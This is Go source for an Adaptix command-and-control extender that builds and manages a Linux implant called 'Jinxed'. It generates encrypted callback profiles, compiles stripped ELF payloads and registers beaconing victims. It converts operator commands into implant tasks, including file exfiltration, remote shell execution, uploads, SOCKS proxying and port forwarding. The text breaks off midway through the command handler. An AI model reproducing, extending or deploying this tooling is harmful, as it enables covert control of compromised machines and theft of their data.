package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/Adaptix-Framework/axc2"
)

// Teamserver is the subset of the Adaptix teamserver API this extender uses.
// The signatures must match the framework exactly - they are checked by the
// type assertion in InitPlugin.
type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, ok := args[key].(bool)
	return ok && v
}

// GenerateConfig mirrors the ui_container keys returned by GenerateUI in
// client/jinxed_linux.axs.
type GenerateConfig struct {
	Arch          string `json:"arch"`
	Format        string `json:"format"`
	Sleep         string `json:"sleep"`
	Jitter        int    `json:"jitter"`
	IsKillDate    bool   `json:"is_killdate"`
	Killdate      string `json:"kill_date"`
	Killtime      string `json:"kill_time"`
	IsWorkingTime bool   `json:"is_workingtime"`
	StartTime     string `json:"start_time"`
	EndTime       string `json:"end_time"`
	Debug         bool   `json:"debug"`
}

// ---------------------------------------------------------------------------
// Profile generation
// ---------------------------------------------------------------------------

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, err
	}

	agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
	if err != nil {
		return nil, fmt.Errorf("invalid agent watermark %q", AgentWatermark)
	}

	sleepSeconds, err := parseDurationToSeconds(generateConfig.Sleep)
	if err != nil {
		return nil, err
	}

	killDate := 0
	if generateConfig.IsKillDate {
		killDate, err = parseKillDate(generateConfig.Killdate, generateConfig.Killtime)
		if err != nil {
			return nil, err
		}
	}

	workingTime := 0
	if generateConfig.IsWorkingTime {
		workingTime, err = parseStringToWorkingTime(generateConfig.StartTime + "-" + generateConfig.EndTime)
		if err != nil {
			return nil, err
		}
	}

	for _, transportProfile := range profile.ListenerProfiles {
		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		if protocol != "http" {
			return nil, fmt.Errorf("listener protocol %q is not supported by the native Linux agent (use BeaconHTTP)", protocol)
		}

		listenerWatermark, _ := strconv.ParseInt(transportProfile.Watermark, 16, 64)

		encryptKeyHex, _ := listenerMap["encrypt_key"].(string)
		encryptKey, err := hex.DecodeString(encryptKeyHex)
		if err != nil || len(encryptKey) != 16 {
			return nil, errors.New("listener encrypt_key must be 32 hex characters")
		}

		params := []interface{}{
			int(agentWatermark),
			killDate,
			workingTime,
			sleepSeconds,
			generateConfig.Jitter,
			int(listenerWatermark),
		}

		lines, _ := listenerMap["callback_addresses"].([]interface{})
		uriRaw, _ := listenerMap["uri"].([]interface{})
		userAgentRaw, _ := listenerMap["user_agent"].([]interface{})
		hostHeaderRaw, _ := listenerMap["host_header"].([]interface{})

		httpMethod, _ := listenerMap["http_method"].(string)
		ssl, _ := listenerMap["ssl"].(bool)
		parameterName, _ := listenerMap["hb_header"].(string)
		requestHeaders, _ := listenerMap["request_headers"].(string)

		var hosts []string
		var ports []int
		for _, raw := range lines {
			line, ok := raw.(string)
			if !ok {
				continue
			}
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			host, portStr, err := net.SplitHostPort(line)
			if err != nil {
				return nil, fmt.Errorf("invalid callback address %q", line)
			}
			port, err := strconv.Atoi(portStr)
			if err != nil || port < 1 || port > 65535 {
				return nil, fmt.Errorf("invalid callback port in %q", line)
			}
			hosts = append(hosts, host)
			ports = append(ports, port)
		}
		if len(hosts) == 0 {
			return nil, errors.New("listener has no callback addresses")
		}

		var uris []string
		for _, raw := range uriRaw {
			if u, ok := raw.(string); ok && strings.TrimSpace(u) != "" {
				uris = append(uris, strings.TrimSpace(u))
			}
		}
		if len(uris) == 0 {
			return nil, errors.New("listener has no URIs")
		}

		var userAgents []string
		for _, raw := range userAgentRaw {
			if ua, ok := raw.(string); ok && strings.TrimSpace(ua) != "" {
				userAgents = append(userAgents, strings.TrimSpace(ua))
			}
		}
		if len(userAgents) == 0 {
			return nil, errors.New("listener has no User-Agent values")
		}

		var hostHeaders []string
		for _, raw := range hostHeaderRaw {
			if hh, ok := raw.(string); ok && strings.TrimSpace(hh) != "" {
				hostHeaders = append(hostHeaders, strings.TrimSpace(hh))
			}
		}

		pagePayload, _ := listenerMap["page-payload"].(string)
		const marker = "<<<PAYLOAD_DATA>>>"
		markerIndex := strings.Index(pagePayload, marker)
		if markerIndex < 0 {
			return nil, errors.New("listener page-payload is missing the <<<PAYLOAD_DATA>>> marker")
		}
		ansPre := markerIndex
		ansPost := len(pagePayload) - markerIndex - len(marker)

		rotationMode := 0 // 0 = sequential, 1 = random
		if mode, _ := listenerMap["rotation_mode"].(string); mode == "random" {
			rotationMode = 1
		}

		proxyType := 0
		useProxy, _ := listenerMap["use_proxy"].(bool)
		proxyHost, _ := listenerMap["proxy_host"].(string)
		proxyPort := 0
		if v, ok := listenerMap["proxy_port"].(float64); ok {
			proxyPort = int(v)
		}
		proxyUsername, _ := listenerMap["proxy_username"].(string)
		proxyPassword, _ := listenerMap["proxy_password"].(string)
		proxyScheme, _ := listenerMap["proxy_type"].(string)
		if useProxy && proxyHost != "" {
			proxyType = 1
			if proxyScheme == "https" {
				proxyType = 2
			}
		}

		params = append(params, ssl)
		params = append(params, len(hosts))
		for i := range hosts {
			params = append(params, hosts[i])
			params = append(params, ports[i])
		}
		params = append(params, httpMethod)
		params = append(params, len(uris))
		for _, u := range uris {
			params = append(params, u)
		}
		params = append(params, parameterName)
		params = append(params, len(userAgents))
		for _, ua := range userAgents {
			params = append(params, ua)
		}
		params = append(params, requestHeaders)
		params = append(params, ansPre)
		params = append(params, ansPost)
		params = append(params, len(hostHeaders))
		for _, hh := range hostHeaders {
			params = append(params, hh)
		}
		params = append(params, rotationMode)
		params = append(params, proxyType)
		params = append(params, proxyHost)
		params = append(params, proxyPort)
		params = append(params, proxyUsername)
		params = append(params, proxyPassword)

		packedParams, err := PackArray(params)
		if err != nil {
			return nil, err
		}
		cryptParams, err := RC4Crypt(packedParams, encryptKey)
		if err != nil {
			return nil, err
		}

		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
		packedProfile, err := PackArray(profileArray)
		if err != nil {
			return nil, err
		}
		agentProfiles = append(agentProfiles, packedProfile)
	}

	return agentProfiles, nil
}

// ---------------------------------------------------------------------------
// Payload build
// ---------------------------------------------------------------------------

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("exactly one listener profile is required")
	}

	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, "", err
	}

	var goarch string
	switch generateConfig.Arch {
	case "amd64", "x64", "":
		goarch = "amd64"
	case "arm64":
		goarch = "arm64"
	case "386", "x86":
		goarch = "386"
	case "arm":
		goarch = "arm"
	default:
		return nil, "", fmt.Errorf("unsupported architecture %q", generateConfig.Arch)
	}

	if generateConfig.Format != "" && generateConfig.Format != "ELF" {
		return nil, "", fmt.Errorf("unsupported format %q (only ELF is supported)", generateConfig.Format)
	}

	srcDir, err := findAgentSource(ModuleDir)
	if err != nil {
		return nil, "", err
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
		fmt.Sprintf("Agent source: %s", srcDir))
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
		fmt.Sprintf("Target: linux/%s, payload profile: %d bytes", goarch, len(agentProfiles[0])))

	tempDir, err := os.MkdirTemp("", "jinxed-build-*")
	if err != nil {
		return nil, "", err
	}

	buildSrc := filepath.Join(tempDir, "src")
	if err := copyTree(srcDir, buildSrc); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("staging agent source: %w", err)
	}

	profileFile := fmt.Sprintf(`// Code generated by the Jinxed Adaptix extender at payload build time.
// DO NOT EDIT.

package main

var profileBlob = []byte{%s}
`, goByteLiteral(agentProfiles[0]))

	if err := os.WriteFile(filepath.Join(buildSrc, "zz_profile_gen.go"), []byte(profileFile), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	filename := fmt.Sprintf("jinxed_%s", goarch)
	buildPath := filepath.Join(tempDir, filename)

	ldflags := "-s -w"
	if generateConfig.Debug {
		ldflags = ""
	}

	buildCmd := fmt.Sprintf(
		"GOWORK=off CGO_ENABLED=0 GOOS=linux GOARCH=%s go build -trimpath -buildvcs=false -ldflags=%q -o %q .",
		goarch, ldflags, buildPath,
	)

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling agent...")
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, buildSrc, "sh", "-c", buildCmd); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	payload, err := os.ReadFile(buildPath)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)

	if len(payload) < 4 || payload[0] != 0x7f || payload[1] != 'E' || payload[2] != 'L' || payload[3] != 'F' {
		return nil, "", errors.New("build produced a non-ELF file")
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS,
		fmt.Sprintf("Payload built: %s (%d bytes)", filename, len(payload)))

	return payload, filename, nil
}

// ---------------------------------------------------------------------------
// Agent registration
// ---------------------------------------------------------------------------

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	packer := CreatePacker(beat)
	if !packer.CheckPacker([]string{
		"int", "int", "int", "int", "word", "word", "byte",
		"word", "word", "int", "byte", "byte", "int", "byte",
		"array", "array", "array", "array", "array",
	}) {
		return agentData, nil, errors.New("invalid registration beat")
	}

	agentData.Sleep = packer.ParseInt32()
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(int8(packer.ParseInt8()))
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIP := packer.ParseInt32()
	flag := packer.ParseInt8()

	arch64 := (flag & 0b00000001) > 0
	agentData.Elevated = (flag & 0b00000100) > 0

	agentData.Arch = "x32"
	if arch64 {
		agentData.Arch = "x64"
	}
	agentData.InternalIP = int32ToIPv4(internalIP)

	agentData.SessionKey = packer.ParseBytes()
	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = string(packer.ParseBytes())
	agentData.Process = string(packer.ParseBytes())

	// Linux extension fields (see agent.buildBeat).
	osRelease := ""
	kernel := ""
	machine := ""
	if packer.Size() > 0 {
		osRelease = packer.ParseString()
	}
	if packer.Size() > 0 {
		kernel = packer.ParseString()
	}
	if packer.Size() > 0 {
		machine = packer.ParseString()
	}

	switch machine {
	case "amd64", "x86_64":
		agentData.Arch = "x64"
	case "arm64", "aarch64":
		agentData.Arch = "arm64"
	case "386", "i686":
		agentData.Arch = "x86"
	case "arm", "armv7l":
		agentData.Arch = "arm"
	}

	agentData.Os = adaptix.OS_LINUX
	desc := strings.TrimSpace(strings.Join([]string{osRelease, kernel, machine}, " "))
	if desc == "" {
		desc = fmt.Sprintf("Linux %d.%d.%d %s", majorVersion, minorVersion, buildNumber, agentData.Arch)
	}
	agentData.OsDesc = desc

	if len(agentData.SessionKey) != 16 {
		return agentData, nil, errors.New("invalid session key in beat")
	}

	return agentData, &ExtenderAgent{}, nil
}

// ---------------------------------------------------------------------------
// Crypto / task packing
// ---------------------------------------------------------------------------

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	for _, taskData := range tasks {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		packData = append(packData, taskData.Data...)

		size := make([]byte, 4)
		size[0] = byte(taskId)
		size[1] = byte(taskId >> 8)
		size[2] = byte(taskId >> 16)
		size[3] = byte(taskId >> 24)
		packData = append(packData, size...)
	}

	out := make([]byte, 4, 4+len(packData))
	out[0] = byte(len(packData))
	out[1] = byte(len(packData) >> 8)
	out[2] = byte(len(packData) >> 16)
	out[3] = byte(len(packData) >> 24)

	return append(out, packData...), nil
}

// PivotPackData is part of the ExtenderAgent contract. SMB/TCP pivot agents are
// a Windows-only feature; the Linux agent deliberately does not implement them.
func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	return adaptix.TaskData{}, errors.New("pivoting is not supported by the Linux agent")
}

// ---------------------------------------------------------------------------
// Misc helpers used by CreateCommand
// ---------------------------------------------------------------------------

func int32ToIPv4(ip uint) string {
	return net.IPv4(byte(ip), byte(ip>>8), byte(ip>>16), byte(ip>>24)).String()
}

func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// CreateTaskCommandSaveMemory chunks an upload into COMMAND_SAVEMEMORY tasks.
func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
	const chunkSize = 0x100000 // 1 MiB
	memoryId := int(rand.Uint32())
	bufferSize := len(buffer)

	taskData := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_TASK,
		AgentId: agentId,
		Sync:    false,
	}

	for start := 0; start < bufferSize; start += chunkSize {
		fin := start + chunkSize
		if fin > bufferSize {
			fin = bufferSize
		}
		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}
		taskData.Data, _ = PackArray(array)
		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())
		ts.TsTaskCreate(agentId, "", "", taskData)
	}
	return memoryId
}

// decodeUploadArg accepts the base64 payload produced by addArgFile.
func decodeUploadArg(value string) ([]byte, error) {
	content, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return nil, errors.New("invalid local_file payload")
	}
	return content, nil
}

// ---------------------------------------------------------------------------
// Command creation
// ---------------------------------------------------------------------------

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}
	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
	}
	messageData.Message, _ = args["message"].(string)

	var array []interface{}

	switch command {

	case "cat":
		path, e := getStringArg(args, "path")
		if e != nil {
			err = e
			goto RET
		}
		array = []interface{}{COMMAND_CAT, path}

	case "cd":
		path, e := getStringArg(args, "path")
		if e != nil {
			err = e
			goto RET
		}
		array = []interface{}{COMMAND_CD, path}

	case "cp":
		src, e := getStringArg(args, "src")
		if e != nil {
			err = e
			goto RET
		}
		dst, e := getStringArg(args, "dst")
		if e != nil {
			err = e
			goto RET
		}
		array = []interface{}{COMMAND_COPY, src, dst}

	case "disks":
		array = []interface{}{COMMAND_DISKS}

	case "download":
		path, e := getStringArg(args, "file")
		if e != nil {
			err = e
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, path}

	case "exfil":
		fid, e := getStringArg(args, "file_id")
		if e != nil {
			err = e
			goto RET
		}
		fileId, e := strconv.ParseInt(fid, 16, 64)
		if e != nil {
			err = errors.New("file_id must be an 8 digit hexadecimal id")
			goto RET
		}
		switch subcommand {
		case "cancel":
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_CANCELED, int(fileId)}
		case "stop":
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_STOPPED, int(fileId)}
		case "start":
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_RUNNING, int(fileId)}
		default:
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}

	case "getuid":
		array = []interface{}{COMMAND_GETUID}

	case "jobs":
		switch subcommand {
		case "list":
			array = []interface{}{COMMAND_JOB_LIST}
		case "kill":
			job, e := getStringArg(args, "task_id")
			if e != nil {
				err = e
				goto RET
			}
			jobId, e := strconv.ParseInt(job, 16, 64)
			if e != nil {
				err = errors.New("task_id must be a hexadecimal job id")
				goto RET
			}
			array = []interface{}{COMMAND_JOBS_KILL, int(jobId)}
		default:
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "ls":
		dir, _ := args["path"].(string)
		array = []interface{}{COMMAND_LS, dir}

	case "lportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL
		lportNumber, _ := getFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			lhost, e := getStringArg(args, "lhost")
			if e != nil {
				err = e
				goto RET
			}
			fhost, e := getStringArg(args, "fwdhost")
			if e != nil {
				err = e
				goto RET
			}
			fportNumber, _ := getFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var tunnelId string
			tunnelId, err = Ts.TsTunnelCreateLportfwd(agentData.Id, "", lhost, lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}
			taskData.Completed = true
			taskData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"
			messageData.Message = ""

		} else if subcommand == "stop" {
			taskData.Completed = true
			Ts.TsTunnelStopLportfwd(agentData.Id, lport)
			taskData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"
			messageData.Message = ""
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "mv":
		src, e := getStringArg(args, "src")
		if e != nil {
			err = e
			goto RET
		}
		dst, e := getStringArg(args, "dst")
		if e != nil {
			err = e
			goto RET
		}
		array = []interface{}{COMMAND_MV, src, dst}

	case "mkdir":
		path, e := getStringArg(args, "path")
		if e != nil {
			err = e
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, path}

	case "profile":
		switch subcommand {
		case "download.chunksize":
			size, e := getFloatArg(args, "size")
			if e != nil {
				err = e
				goto RET
			}
			if int(size) < 1024 {
				err = errors.New("chunk size must be at least 1024 bytes")
				goto RET
			}
			array = []interface{}{COMMAND_PROFILE, 2, int(size)}

		case "killdate":
			dt, e := getStringArg(args, "datetime")
			if e != nil {
				err = e
				goto RET
			}
			killDate := 0
			if dt != "0" {
				killDate, err = parseKillDate(strings.TrimSpace(strings.SplitN(dt, " ", 2)[0]), strings.TrimSpace(secondOrEmpty(dt)))
				if err != nil {
					goto RET
				}
			}
			array = []interface{}{COMMAND_PROFILE, 3, killDate}

		case "workingtime":
			t, e := getStringArg(args, "time")
			if e != nil {
				err = e
				goto RET
			}
			workingTime := 0
			if t != "0" {
				workingTime, err = parseStringToWorkingTime(t)
				if err != nil {
					goto RET
				}
			}
			array = []interface{}{COMMAND_PROFILE, 4, workingTime}

		default:
			err = errors.New("subcommand for 'profile' not found")
			goto RET
		}

	case "ps":
		switch subcommand {
		case "list":
			array = []interface{}{COMMAND_PS_LIST}

		case "kill":
			pid, e := getFloatArg(args, "pid")
			if e != nil {
				err = e
				goto RET
			}
			array = []interface{}{COMMAND_PS_KILL, int(pid)}

		case "run":
			taskData.Type = adaptix.TASK_TYPE_JOB
			output := getBoolArg(args, "-o")
			impersonation := getBoolArg(args, "-i")
			suspend := getBoolArg(args, "-s")
			programState := 0
			if suspend {
				programState = 4
			}
			programArgs, _ := args["args"].(string)
			array = []interface{}{COMMAND_PS_RUN, output, impersonation, programState, programArgs}

		default:
			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
			goto RET
		}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "rm":
		path, e := getStringArg(args, "path")
		if e != nil {
			err = e
			goto RET
		}
		array = []interface{}{COMMAND_RM, path}

	case "rportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL
		lportNumber, _ := getFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			fhost, e := getStringArg(args, "fwdhost")
			if e != nil {
				err = e
				goto RET
			}
			fportNumber, _ := getFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var tunnelId string
			tunnelId, err = Ts.TsTunnelCreateRportfwd(agentData.Id, "", lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}
			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
			messageData.Status = adaptix.MESSAGE_INFO

		} else if subcommand == "stop" {
			taskData.Completed = true
			Ts.TsTunnelStopRportfwd(agentData.Id, lport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Reverse port forwarding has been stopped"
			messageData.Message = ""
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "sleep":
		sleep, e := getStringArg(args, "sleep")
		if e != nil {
			err = e
			goto RET
		}
		jitter, _ := getFloatArg(args, "jitter")
		jitterTime := int(jitter)

		sleepTime, e := parseDurationToSeconds(sleep)
		if e != nil {
			err = e
			goto RET
		}
		if jitterTime < 0 || jitterTime > 100 {
			err = errors.New("jitter must be from 0 to 100")
			goto RET
		}

		if jitterTime > 0 {
			messageData.Message = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		} else {
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
		}
		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL
		portNumber, e := getFloatArg(args, "port")
		port := int(portNumber)
		if e != nil || port < 1 || port > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			address, e := getStringArg(args, "address")
			if e != nil {
				err = e
				goto RET
			}

			var tunnelId string
			if getBoolArg(args, "-socks4") {
				tunnelId, err = Ts.TsTunnelCreateSocks4(agentData.Id, "", address, port)
			} else if getBoolArg(args, "-auth") {
				username, e := getStringArg(args, "username")
				if e != nil {
					err = e
					goto RET
				}
				password, e := getStringArg(args, "password")
				if e != nil {
					err = e
					goto RET
				}
				tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
			} else {
				tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
			}
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = fmt.Sprintf("SOCKS proxy server running on port %d", port)
			taskData.ClearText = "\n"
			messageData.Message = ""

		} else if subcommand == "stop" {
			taskData.Completed = true
			Ts.TsTunnelStopSocks(agentData.Id, port)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "SOCKS proxy server has been stopped"
			taskData.ClearText = "\n"
			messageData.Message = ""
		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "terminate":
		switch subcommand {
		case "thread":
			array = []interface{}{COMMAND_TERMINATE, 1}
		case "process":
			array = []interface{}{COMMAND_TERMINATE, 2}
		default:
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	case "upload":
		remotePath, e := getStringArg(args, "remote_path")
		if e != nil {
			err = e
			goto RET
		}
		localFile, e := getStringArg(args, "local_file")
		if e != nil {
			err = e
			goto RET
		}
		content, e := decodeUploadArg(localFile)
		if e != nil {
			err = e
			goto RET
		}
		memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, content)
		array = []interface{}{COMMAND_UPLOAD, memoryId, remotePath}

	case "shell":
		cmdParams, e := getStringArg(args, "cmd_params")
		if e != nil {
			err = e
			goto RET
		}
		taskData.Type = adaptix.TASK_TYPE_JOB
		array = []interface{}{COMMAND_PS_RUN, true, false, 0, "/bin/sh -c " + shellQuote(cmdParams)}

	case "env":
		switch subcommand {
		case "list":
			array = []interface{}{COMMAND_ENV, 0, "", ""}
		case "get":
			name, e := getStringArg(args, "name")
			if e != nil {
				err = e
				goto RET
			}
			array = []interface{}{COMMAND_ENV, 1, name, ""}
